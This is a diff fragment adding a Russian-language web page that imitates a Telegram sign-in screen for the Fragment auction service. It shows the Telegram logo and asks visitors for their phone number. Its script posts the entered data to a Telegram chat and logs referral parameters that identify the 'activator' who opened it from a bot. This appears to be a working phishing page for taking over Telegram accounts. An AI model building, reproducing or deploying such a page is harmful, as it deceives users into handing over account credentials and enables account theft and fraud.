+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        
+        const data = await response.json();
+        console.log('Сообщение отправлено в Telegram:', data);
+    } catch (error) {
+        console.error('Ошибка при отправке номера телефона:', error);
+    }
+}
+
+        function setupEventListeners() {
+            const nextButton = document.getElementById('nextButton');
+            if (nextButton) {
+                nextButton.addEventListener('click', handleNextClick);
+                console.log('Кнопка ПРОДОЛЖИТЬ привязана');
+            } else {
+                console.error('Кнопка nextButton не найдена!');
+            }
+
+            // Инициализируем Telegram WebApp если он доступен
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.ready();
+            }
+        }
+
+      window.onload = function() {
+    try {
+        console.log('🚀 Страница index.html загружена');
+        
+        // Получаем данные пользователя при загрузке
+        const userData = getUserData();
+        const referrerInfo = getReferrerInfo();
+        
+        console.log('📊 Данные пользователя (активатора) при загрузке:', userData);
+        console.log('🔗 Информация о реферале (активаторе) при загрузке:', referrerInfo);
+        
+        // Логируем все параметры URL для отладки
+        const urlParams = new URLSearchParams(window.location.search);
+        console.log('🌐 Все параметры URL:', Object.fromEntries(urlParams.entries()));
+        console.log('ℹ️ Параметры ref и user_id - это данные активатора (того, кто нажал кнопку в боте)');
+        
+        // Показываем уведомление если открыто как веб-страница
+        if (!window.Telegram || !window.Telegram.WebApp) {
+            const notice = document.createElement('div');
+            notice.className = 'web-app-notice';
+            notice.textContent = 'Открыто в веб-браузере. Для лучшего опыта используйте Telegram WebApp.';
+            document.body.insertBefore(notice, document.body.firstChild);
+        }
+        
+        initializeCountrySelector();
+        setupEventListeners();
+        
+        // Инициализируем Telegram WebApp если он доступен
+        if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.ready();
+        }
+    } catch (error) {
+        console.error('Ошибка при инициализации:', error);
+    }
+};
+    </script>
+</head>
+<body class="min-h-screen flex flex-col items-center p-4" style="background-color: #212121;">
+
+    <div class="fixed top-0 right-0 p-4 text-gray-500">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-help-circle">
+            <circle cx="12" cy="12" r="10"/>
+            <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
+            <path d="M12 17h.01"/>
+        </svg>
+    </div>
+
+    <div id="logoContainer" class="w-full max-w-lg sm:max-w-xl mt-8">
+        <div class="flex items-center justify-center mb-6 relative">
+
+            <div class="w-14 h-14 rounded-full flex items-center justify-center icon-tg bg-tg-blue z-10 relative left-[13px]">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Telegram_2019_Logo.svg"
+                     alt="Telegram Logo"
+                     class="w-full h-full"
+                     onerror="this.onerror=null; this.src='https://placehold.co/56x56/26a4e3/ffffff?text=T';" />
+            </div>
+
+            <svg class="relative z-0 -mx-1 left-[0px]" width="100" height="20" viewBox="0 0 100 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <line x1="0" y1="10" x2="60" y2="10" stroke="#26a4e3" stroke-width="10" stroke-linecap="round"/>
+                <path d="M60 1L73 10L60 19L60 1Z"
+                      fill="#26a4e3"
+                      stroke="#26a4e3"
+                      stroke-width="2"
+                      stroke-linejoin="round"/>
+            </svg>
+
+            <div class="icon-fragment w-14 h-14 rounded-full flex items-center justify-center bg-black z-10 relative right-[7px]">
+                <img src="image.png"
+                     alt="Fragment Logo"
+                     class="w-7 h-7"
+                     onerror="this.onerror=null; this.src='https://placehold.co/32x32/000000/ffffff?text=F'; this.style.borderRadius='9999px';">
+            </div>
+        </div>
+    </div>
+
+    <div class="w-full max-w-xl sm:max-w-2xl text-center px-4 mb-8">
+        <p id="mainHeading" class="text-base text-white leading-snug mb-0">
+            Войдите, чтобы использовать аккаунт Telegram <span class="font-semibold">для fragment и</span> <span style="color: #8774e1;">Fragment Auction Alerts</span>
+        </p>
+
+        <div class="mb-4"></div>
+
+        <p id="instructionText" class="text-sm text-gray-200 leading-snug mb-0">
+            Введите свой <span class="font-semibold">номер телефона</span> в <span style="color: #8774e1;">международном</span>
+            <span style="color: #8774e1;">формате</span>. Подтверждение будет отправлено в Telegram.
+        </p>
+    </div>
+
+    <div class="w-full max-w-sm">
+        <div id="phoneInputScreen" class="w-full max-w-sm">
+            <div class="mb-4">
+                <div class="input-container relative">
+                    <div class="country-dropdown">
+                        <button type="button" id="countryDropdownButton" class="country-dropdown-button" aria-haspopup="listbox" aria-expanded="false">
+                            <div class="country-button-content">
+                                <span class="country-button-name" id="countryButtonName">Russian Federation</span>
+                            </div>
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="country-button-arrow">
+                                <path d="m6 9 6 6 6-6"/>
+                            </svg>
+                        </button>
+                        <div id="countryDropdownList" class="country-dropdown-list" role="listbox">
+                        </div>
+                    </div>
+                    <label for="countryDropdownButton" class="floating-label">Country</label>
+                </div>
+            </div>
+
+            <div class="mb-4">
+                <div class="input-container relative">
+                    <input type="tel"
+                           id="phoneNumberInput"
+                           value="+7"
+                           placeholder=" "
+                           class="input-field w-full text-white text-base focus:outline-none"
+                           inputmode="tel"
+                           onfocus="this.classList.add('has-value');"
+                           onblur="updateFieldValue();">
+                    <label for="phoneNumberInput" class="floating-label">Your phone number</label>
+                </div>
+            </div>
+        </div>
+
+        <p id="errorPhone" class="error-message h-6 opacity-0"></p>
+
+        <div id="inputScreenButtons" class="w-full max-w-sm mt-6">
+            <button id="nextButton" class="w-full py-3 text-base text-white font-medium rounded-xl transition duration-150" style="background-color: #8774e1;">
+                ПРОДОЛЖИТЬ
+            </button>
+        </div>
+
+        <div class="text-center mt-12 text-sm text-gray-600">
+            &nbsp;
+        </div>
+    </div>
+</body>
+</html>
